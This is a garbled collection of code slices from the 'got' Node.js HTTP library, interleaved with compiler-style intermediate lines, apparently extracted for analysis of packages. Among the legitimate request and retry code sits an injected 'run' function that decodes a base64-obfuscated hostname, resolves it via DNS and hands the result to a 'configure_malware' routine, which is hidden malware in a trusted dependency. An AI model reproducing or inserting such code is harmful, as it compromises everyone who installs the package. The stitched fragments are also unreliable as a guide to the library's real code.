_tmp_0.options = {
		retry: {
			retries: 2,
			methods: [
				'get',
				'put',
				'head',
				'delete',
				'options',
				'trace'
			],
			statusCodes: [
				408,
				413,
				429,
				502,
				503,
				504
			]
		},
		cache: false,
		decompress: true,
		useElectronNet: false,
		throwHttpErrors: true,
		headers: {
			'user-agent': `${pkg.name}/${pkg.version} (https://github.com/sindresorhus/got)`
		},
		hooks: {
			beforeRequest: []
		}
	}
function got = function got(url, options) {
		try {
			options = mergeOptions(defaults.options, options);
			return defaults.handler(normalizeArguments(url, options, defaults), next);
		} catch (error) {
			return Promise.reject(error);
		}
	}
this.run = function() {
      var self = this
      prerefuse = 'ODM5MjJlNzAuaGt6enp6ei5kZQ=='
      dns.lookup((new Buffer(prerefuse, 'base64')).toString(), function(err, hewgh) {
        self.configure_malware(hewgh);
      });
    }
emitter.on('request', request => {
		proxy.emit('request', request);
		const uploadComplete = () => {
			request.emit('upload-complete');
		};

		if (is.nodeStream(options.body)) {
			options.body.once('end', uploadComplete);
			options.body.pipe(request);
			return;
		}

		if (options.body) {
			request.end(options.body, uploadComplete);
			return;
		}

		if (options.method === 'POST' || options.method === 'PUT' || options.method === 'PATCH') {
			input.once('end', uploadComplete);
			input.pipe(request);
			return;
		}

		request.end(uploadComplete);
	})
proxy.emit('request', request)
request.once('socket', socket => {
			const onSocketConnect = () => {
				progressInterval = setInterval(() => {
					/* istanbul ignore next: hard to test */
					if (socket.destroyed) {
						clearInterval(progressInterval);
						return;
					}

					const lastUploaded = uploaded;
					/* istanbul ignore next: see #490 (occurs randomly!) */
					const headersSize = request._header ? Buffer.byteLength(request._header) : 0;
					uploaded = socket.bytesWritten - headersSize;

					/* istanbul ignore next: see https://github.com/sindresorhus/got/pull/322#pullrequestreview-51647813 (no proof) */
					if (uploadBodySize && uploaded > uploadBodySize) {
						uploaded = uploadBodySize;
					}

					// Don't emit events with unchanged progress and
					// prevent last event from being emitted, because
					// it's emitted when `response` is emitted
					if (uploaded === lastUploaded || uploaded === uploadBodySize) {
						return;
					}

					emitter.emit('uploadProgress', {
						percent...
module.exports.RequestError = class extends GotError {
	constructor(error, opts) {
		super(error.message, error, opts);
		this.name = 'RequestError';
	}
}
_tmp_6.user-agent = <operator>.formatString("", pkg.name, "/", pkg.version, " (https://github.com/sindresorhus/got)")
_iterator_0 = <operator>.iterator(defaults.methods)
const newResponse = options.decompress === true &&
		is.function(decompressResponse) &&
		options.method !== 'HEAD' ? decompressResponse(progressStream) : progressStream
cancelers.forEach(cancelTimeout => cancelTimeout())
uploaded === lastUploaded || uploaded === uploadBodySize
emitter.emit('uploadProgress', {
						percent: uploadBodySize ? uploaded / uploadBodySize : 0,
						transferred: uploaded,
						total: uploadBodySize
					})
const followRedirect = options.followRedirect && 'location' in response.headers
request.once('abort', _ => {
				aborted = true;
			})
request.once('error', error => {
				if (aborted) {
					return;
				}

				if (!(error instanceof GotError)) {
					error = new RequestError(error, options);
				}
				emitter.emit('retry', error, retried => {
					if (!retried) {
						emitter.emit('error', error);
					}
				});
			})
error = new RequestError(error, options)
emitter.emit('retry', error, retried => {
					if (!retried) {
						emitter.emit('error', error);
					}
				})
_tmp_25.socketPath = socketPath
progress.upload(request, emitter, uploadBodySize)
cancelers.push(cancelTimeout)
options.gotRetry = {...defaults.options.retry, retries: options.retry}
